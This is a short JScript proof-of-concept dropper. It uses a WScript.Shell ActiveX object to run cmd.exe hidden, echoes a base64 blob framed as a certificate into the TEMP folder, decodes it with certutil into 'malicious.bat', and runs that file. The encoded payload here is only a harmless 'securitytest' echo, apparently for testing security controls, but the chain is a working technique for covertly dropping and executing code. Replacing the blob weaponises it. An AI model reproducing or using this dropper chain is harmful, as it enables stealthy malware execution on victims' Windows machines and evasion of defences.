//create ActiveX to run executables and commands
wsh0=new ActiveXObject("WScript.shell");

//write out base64 encoded file to Windows TEMP directory. cmd.exe will be run as a hidden process (0 flag).
wsh0.run("file:///C:\\Windows\\System32\\cmd.exe /C echo -----BEGIN CERTIFICATE----- > %TEMP%\\stest.txt",0);
wsh0.run("file:///C:\\Windows\\System32\\cmd.exe /C echo ZWNobyBzZWN1cml0eXRlc3QgPiAlVEVNUCVcXG1hbGljaW91cy5leGU= >> %TEMP%\\stest.txt",0);
wsh0.run("file:///C:\\Windows\\System32\\cmd.exe /C echo -----END CERTIFICATE----- >> %TEMP%\\stest.txt",0);

//decode base64 encoded fiile and output malicious batch file
wsh0.run("file:///C:\\Windows\\System32\\cmd.exe /C certutil -decode %TEMP%\\stest.txt %TEMP%\\malicious.bat",0);

//execute malicious batch file
wsh0.run("file:///C:\\Windows\\System32\\cmd.exe /C %TEMP%\\malicious.bat",0);
